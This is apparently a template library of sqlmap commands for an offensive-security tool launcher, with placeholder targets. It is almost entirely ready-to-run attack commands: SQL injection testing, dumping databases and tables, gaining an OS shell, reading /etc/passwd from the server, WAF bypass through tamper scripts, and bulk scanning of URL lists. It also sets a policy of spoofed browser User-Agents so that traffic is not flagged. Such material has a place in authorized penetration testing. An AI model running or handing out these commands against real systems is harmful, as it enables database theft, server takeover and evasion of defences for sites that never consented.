# sqlmap

> Automatic SQL injection detection and exploitation tool

<!-- tags: sqli, injection, database, exploitation, web -->

**UA policy:** every outbound request sets an explicit real-browser User-Agent via `{{UA}}` (session-shared across tools). Default = modern Chrome-on-Windows. Alternates: `Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0` (Firefox 128 Linux), `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15` (Safari 17 macOS). `--random-agent` is avoided because sqlmap's built-in pool includes flagged strings.

---

## inject sqli GET param
Test a URL GET parameter for SQL injection.

```bash
sqlmap -u "{{URL:url:http://target.com/page.php?id=1}}" --batch --user-agent="{{UA:str:$(q-ua)}}" -o {{OUTFILE:file:sqlmap-output}}
```

<!-- meta: risk=med | phase=vuln | tags=get,sqli -->

---

## inject sqli POST param
Test POST parameters for SQL injection.

```bash
sqlmap -u "{{URL:url:http://target.com/login.php}}" --data="{{POSTDATA:str:username=admin&password=test}}" --batch --user-agent="{{UA:str:$(q-ua)}}"
```

<!-- meta: risk=med | phase=vuln | tags=post,sqli -->

---

## inject sqli burp request file
Use a saved Burp request file as input for sqlmap.

```bash
sqlmap -r {{REQUEST_FILE:file:request.txt}} --batch --user-agent="{{UA:str:$(q-ua)}}"
```

<!-- meta: risk=med | phase=vuln | tags=burp,request -->

---

## inject sqli cookie param
Test injection in cookie parameters.

```bash
sqlmap -u "{{URL:url:http://target.com/dashboard.php}}" --cookie="{{COOKIE:str:session=abc123; role=user}}" --level 2 --batch --user-agent="{{UA:str:$(q-ua)}}"
```

<!-- meta: risk=med | phase=vuln | tags=cookie,sqli -->

---

## enum databases sqli
List all databases on the backend DBMS.

```bash
sqlmap -u "{{URL:url:http://target.com/page.php?id=1}}" --dbs --batch --user-agent="{{UA:str:$(q-ua)}}"
```

<!-- meta: risk=med | phase=enum | tags=databases,enumeration -->

---

## dump table data sqli
Dump a specific table from a database.

```bash
sqlmap -u "{{URL:url:http://target.com/page.php?id=1}}" -D {{DATABASE:str:targetdb}} -T {{TABLE:str:users}} --dump --batch --user-agent="{{UA:str:$(q-ua)}}"
```

<!-- meta: risk=med | phase=enum | tags=dump,tables -->

---

## sqli os shell rce
Attempt to gain an OS shell through SQL injection.

```bash
sqlmap -u "{{URL:url:http://target.com/page.php?id=1}}" --os-shell --batch --user-agent="{{UA:str:$(q-ua)}}"
```

<!-- meta: risk=high | phase=exploit | tags=shell,rce -->

---

## bypass WAF tamper scripts sqli
Use tamper scripts to bypass WAF or input filters.

```bash
sqlmap -u "{{URL:url:http://target.com/page.php?id=1}}" --tamper={{TAMPER:str:space2comment,between}} --batch --user-agent="{{UA:str:$(q-ua)}}"
```

<!-- meta: risk=med | phase=vuln | tags=tamper,waf-bypass -->

---

## scan sqli high level risk
Run sqlmap with maximum detection level and risk settings.

```bash
sqlmap -u "{{URL:url:http://target.com/page.php?id=1}}" --level={{LEVEL:int:5}} --risk={{RISK:int:3}} --batch --user-agent="{{UA:str:$(q-ua)}}" --threads={{THREADS:int:5}}
```

<!-- meta: risk=high | phase=vuln | tags=aggressive,thorough -->

---

## dump all sqli full auto
Fully automated scan: detect, enumerate, and dump everything.

```bash
sqlmap -u "{{URL:url:http://target.com/page.php?id=1}}" --batch --user-agent="{{UA:str:$(q-ua)}}" --dbs --dump-all --exclude-sysdbs -o {{OUTFILE:file:sqlmap-full}}
```

<!-- meta: risk=high | phase=exploit | tags=auto,full-dump -->

---

## inject second order sqli
Use a second request file for stored-and-executed (second-order) injections.

```bash
sqlmap -r {{REQ:file:request.txt}} -p {{PARAM:str:genres}} --second-req {{SECOND:file:second.txt}} --tamper=space2comment --level 5 --risk 3 --batch --user-agent="{{UA:str:$(q-ua)}}" --dbs
```

<!-- meta: risk=med | phase=vuln | tags=second-order,multi-step -->

---

## route sqli burp proxy
Route sqlmap traffic through a local Burp proxy for inspection.

```bash
sqlmap -r {{REQ:file:request.txt}} --proxy http://127.0.0.1:8080 --tamper=space2comment --level 5 --risk 3 --batch --user-agent="{{UA:str:$(q-ua)}}" --dbs
```

<!-- meta: risk=med | phase=vuln | tags=proxy,burp -->

---

## inject sqli url list bulk
Test multiple URLs from a file in one run.

```bash
sqlmap -m {{URL_LIST:file:urls.txt}} --tamper=space2comment --level 5 --risk 3 --batch --user-agent="{{UA:str:$(q-ua)}}" --dbs --technique=BEUSTQ
```

<!-- meta: risk=med | phase=vuln | tags=batch,urls,bulk -->

---

## sqli read file filesystem
Read a file from the database server filesystem (when DBMS user has FILE priv).

```bash
sqlmap -r {{REQ:file:request.txt}} --batch --user-agent="{{UA:str:$(q-ua)}}" --file-read={{REMOTE_FILE:str:/etc/passwd}}
```

<!-- meta: risk=high | phase=exploit | tags=file-read,filesystem -->

---

## limit sqli techniques
Restrict sqlmap to specific injection techniques (B,E,U,S,T,Q).

```bash
sqlmap -u "{{URL:url}}" --technique={{TECH:choice:BEUSQ=all minus time-based,BEUSTQ=all techniques,B=boolean-based blind,E=error-based,U=union query,S=stacked queries,T=time-based blind,Q=inline query,BT=boolean + time,UT=union + time,BEU=boolean + error + union,BEUST=all minus inline}} --batch --user-agent="{{UA:str:$(q-ua)}}"
```

<!-- meta: risk=med | phase=vuln | tags=technique,filter -->
